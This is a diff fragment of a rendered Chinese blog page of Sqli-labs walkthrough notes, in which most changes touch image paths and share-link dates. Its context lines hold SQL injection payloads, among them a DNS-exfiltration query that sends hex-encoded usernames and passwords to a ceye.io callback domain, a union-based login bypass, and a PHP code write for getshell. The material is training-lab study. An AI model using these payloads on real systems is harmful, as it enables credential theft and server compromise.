 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; <span class="keyword">select</span> * from <span class="built_in">users</span>;</span><br><span class="line">+----+---------------+------------+</span><br><span class="line">| <span class="built_in">id</span> | username      | password   |</span><br><span class="line">+----+---------------+------------+</span><br><span class="line">|  8 | admin         | 233        |</span><br><span class="line">| 20 | admin<span class="string">&#x27;#hacker | 111        |</span></span><br><span class="line"><span class="string">+----+---------------+------------+</span></span><br></pre></td></tr></table></figure>
@@ -1505,7 +1500,7 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;;select load_file(concat(&#x27;\\\\&#x27;,(select hex(concat_ws(&#x27;~&#x27;,username,password)) from users limit 0,1),&#x27;.gvc791.ceye.io\\abc&#x27;))--+</span><br></pre></td></tr></table></figure>
 
 <p>Hex 编码的目的就是减少干扰，因为域名是有一定的规范，有些特殊符号是不能带入的有。</p>
-<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20200517/15897015756622.png"><img src="/images/15897015756622.png" alt="img"></a></p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20200517/15897015756622.png"><img src="/./Sqli-labs%E9%80%9A%E8%BF%87%E7%AC%94%E8%AE%B0.assets/15897015756622.png" alt="img"></a></p>
 <p>手动 Hex 解码即可</p>
 <h3 id="开启日志-Getshell"><a href="#开启日志-Getshell" class="headerlink" title="开启日志 Getshell"></a>开启日志 Getshell</h3><p>需要条件：</p>
 <ol>
@@ -1644,7 +1639,7 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="variable">$row</span>[<span class="number">1</span>];</span><br></pre></td></tr></table></figure>
 
 <p>所以登录了 id 为 1 的 Dumb 用户：</p>
-<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20200517/15897218466276.png"><img src="/images/15897218466276.png" alt="img"></a></p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20200517/15897218466276.png"><img src="/./Sqli-labs%E9%80%9A%E8%BF%87%E7%AC%94%E8%AE%B0.assets/15897218466276.png" alt="img"></a></p>
 <p>尝试<strong>联合查询</strong>:</p>
 <p>HTTP</p>
 <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/Less-42/login.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="language-gauss">login_user=admin&amp;login_password=<span class="number">1</span>&#x27; <span class="built_in">union</span> <span class="built_in">select</span> <span class="number">1</span>,(<span class="built_in">SELECT</span>(<span class="comment">@x)FROM(SELECT(@</span>x:=<span class="number">0x00</span>) ,(<span class="built_in">SELECT</span>(<span class="comment">@x)FROM(users)WHERE(@</span>x)<span class="built_in">IN</span>(<span class="comment">@x:=CONCAT(0x20,@</span>x,username,password,<span class="number">0x3c62723e</span>))))x),<span class="number">3</span><span class="meta">#&amp;mysubmit=Login</span></span></span><br></pre></td></tr></table></figure>
@@ -1778,7 +1773,7 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> /var/www/html/less46.php </span><br><span class="line">1    Dumb    Dumb&lt;?php phpinfo();?&gt;2    Angelina    I-kill-you&lt;?php phpinfo();?&gt;3    Dummy    p@ssword&lt;?php phpinfo();?&gt;4    secure    crappy&lt;?php phpinfo();?&gt;5    stupid    stupidity&lt;?php phpinfo();?&gt;6    superman    genious&lt;?php phpinfo();?&gt;7    batman    mob!le&lt;?php phpinfo();?&gt;8    admin    admin&lt;?php phpinfo();?&gt;9    admin1    admin1&lt;?php phpinfo();?&gt;10    admin2    admin2&lt;?php phpinfo();?&gt;11    admin3    admin3&lt;?php phpinfo();?&gt;12    dhakkan    dumbo&lt;?php phpinfo();?&gt;14    admin4    admin4&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
 
 <p>浏览器访问测试看看：</p>
-<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20200518/15897680165097.png"><img src="/images/15897680165097.png" alt="img"></a></p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20200518/15897680165097.png"><img src="/./Sqli-labs%E9%80%9A%E8%BF%87%E7%AC%94%E8%AE%B0.assets/15897680165097.png" alt="img"></a></p>
 <h2 id="Less-47"><a href="#Less-47" class="headerlink" title="Less-47"></a>Less-47</h2><table>
 <thead>
 <tr>
@@ -2150,17 +2145,17 @@
 
     <div id="share-footer" style="display: none">
       <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://w3nq14.github.io/2026/03/27/Penetration/Sqli-Labs%E9%80%9A%E8%BF%87%E7%AC%94%E8%AE%B0/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://w3nq14.github.io/2026/03/27/Penetration/Sqli-Labs%E9%80%9A%E8%BF%87%E7%AC%94%E8%AE%B0/&text=Sqli-Labs通过笔记"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://w3nq14.github.io/2026/03/27/Penetration/Sqli-Labs%E9%80%9A%E8%BF%87%E7%AC%94%E8%AE%B0/&title=Sqli-Labs通过笔记"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://w3nq14.github.io/2026/03/27/Penetration/Sqli-Labs%E9%80%9A%E8%BF%87%E7%AC%94%E8%AE%B0/&is_video=false&description=Sqli-Labs通过笔记"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=Sqli-Labs通过笔记&body=Check out this article: https://w3nq14.github.io/2026/03/27/Penetration/Sqli-Labs%E9%80%9A%E8%BF%87%E7%AC%94%E8%AE%B0/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://w3nq14.github.io/2026/03/27/Penetration/Sqli-Labs%E9%80%9A%E8%BF%87%E7%AC%94%E8%AE%B0/&title=Sqli-Labs通过笔记"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://w3nq14.github.io/2026/03/27/Penetration/Sqli-Labs%E9%80%9A%E8%BF%87%E7%AC%94%E8%AE%B0/&title=Sqli-Labs通过笔记"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://w3nq14.github.io/2026/03/27/Penetration/Sqli-Labs%E9%80%9A%E8%BF%87%E7%AC%94%E8%AE%B0/&title=Sqli-Labs通过笔记"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://w3nq14.github.io/2026/03/27/Penetration/Sqli-Labs%E9%80%9A%E8%BF%87%E7%AC%94%E8%AE%B0/&title=Sqli-Labs通过笔记"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://w3nq14.github.io/2026/03/27/Penetration/Sqli-Labs%E9%80%9A%E8%BF%87%E7%AC%94%E8%AE%B0/&name=Sqli-Labs通过笔记&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://w3nq14.github.io/2026/03/27/Penetration/Sqli-Labs%E9%80%9A%E8%BF%87%E7%AC%94%E8%AE%B0/&t=Sqli-Labs通过笔记"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://w3nq14.github.io/2026/03/29/Penetration/Sqli-Labs%E9%80%9A%E8%BF%87%E7%AC%94%E8%AE%B0/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://w3nq14.github.io/2026/03/29/Penetration/Sqli-Labs%E9%80%9A%E8%BF%87%E7%AC%94%E8%AE%B0/&text="><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://w3nq14.github.io/2026/03/29/Penetration/Sqli-Labs%E9%80%9A%E8%BF%87%E7%AC%94%E8%AE%B0/&title="><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://w3nq14.github.io/2026/03/29/Penetration/Sqli-Labs%E9%80%9A%E8%BF%87%E7%AC%94%E8%AE%B0/&is_video=false&description="><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=&body=Check out this article: https://w3nq14.github.io/2026/03/29/Penetration/Sqli-Labs%E9%80%9A%E8%BF%87%E7%AC%94%E8%AE%B0/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://w3nq14.github.io/2026/03/29/Penetration/Sqli-Labs%E9%80%9A%E8%BF%87%E7%AC%94%E8%AE%B0/&title="><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://w3nq14.github.io/2026/03/29/Penetration/Sqli-Labs%E9%80%9A%E8%BF%87%E7%AC%94%E8%AE%B0/&title="><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://w3nq14.github.io/2026/03/29/Penetration/Sqli-Labs%E9%80%9A%E8%BF%87%E7%AC%94%E8%AE%B0/&title="><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://w3nq14.github.io/2026/03/29/Penetration/Sqli-Labs%E9%80%9A%E8%BF%87%E7%AC%94%E8%AE%B0/&title="><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://w3nq14.github.io/2026/03/29/Penetration/Sqli-Labs%E9%80%9A%E8%BF%87%E7%AC%94%E8%AE%B0/&name=&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://w3nq14.github.io/2026/03/29/Penetration/Sqli-Labs%E9%80%9A%E8%BF%87%E7%AC%94%E8%AE%B0/&t="><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
 </ul>
 
     </div>
